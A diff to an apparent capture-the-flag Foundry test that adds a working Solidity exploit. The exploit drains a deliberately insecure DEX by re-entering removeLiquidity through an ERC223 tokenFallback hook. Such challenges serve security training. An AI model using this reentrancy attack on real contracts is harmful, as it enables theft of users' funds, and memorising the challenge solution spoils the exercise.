@@ -46,7 +46,13 @@ contract Challenge2Test is Test {
 
         /*//////////////////////////////
         //    Add your hack below!    //
-        //////////////////////////////*/      
+        //////////////////////////////*/  
+
+        Exploit e = new Exploit(address(target));
+        token0.approve(address(e), type(uint256).max);
+        token1.approve(address(e), type(uint256).max);
+        
+        e.hack();    
 
         //============================//
 
@@ -66,9 +72,53 @@ contract Challenge2Test is Test {
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 ////////////////////////////////////////////////////////////*/
 
-
 contract Exploit {
-    IERC20 public token0; // this is insecureumToken
-    IERC20 public token1; // this is simpleERC223Token
-    InsecureDexLP public dex;
+    IERC20 public immutable token0; // this is insecureumToken
+    IERC20 public immutable token1; // this is simpleERC223Token
+    InsecureDexLP public immutable dex;
+
+    address private immutable _player;
+
+    uint256 public num_reentered;
+    bool hacking;
+    uint256 _lpAmount;
+
+    constructor(address _dexAddress) {
+        _player = msg.sender;
+        
+        dex = InsecureDexLP(_dexAddress);
+        token0 = IERC20(dex.token0());
+        token1 = IERC20(dex.token1());
+
+        token1.approve(_dexAddress, type(uint256).max);
+        token0.approve(_dexAddress, type(uint256).max);
+    }
+
+    function hack() public {
+        num_reentered = 0;
+        uint256 token0Balance = token0.balanceOf(_player);
+        uint256 token1Balance = token1.balanceOf(_player);
+
+        token0.transferFrom(_player, address(this), token0Balance);
+        token1.transferFrom(_player, address(this), token1Balance);
+        
+        dex.addLiquidity(token0Balance, token1Balance);
+        _lpAmount = dex.balanceOf(address(this));
+        hacking = true;
+        dex.removeLiquidity(_lpAmount);
+    }
+    function tokenFallback(address _sender, uint256 value, bytes calldata data) external {
+        if (!hacking) {
+            return;
+        }
+        if (num_reentered > 8) {
+            uint256 token0Balance = token0.balanceOf(address(this));
+            uint256 token1Balance = token1.balanceOf(address(this));
+            token0.transfer(_player, token0Balance);
+            token1.transfer(_player, token1Balance);
+            return;
+        }
+        ++num_reentered;
+        dex.removeLiquidity(_lpAmount);
+    }
 }
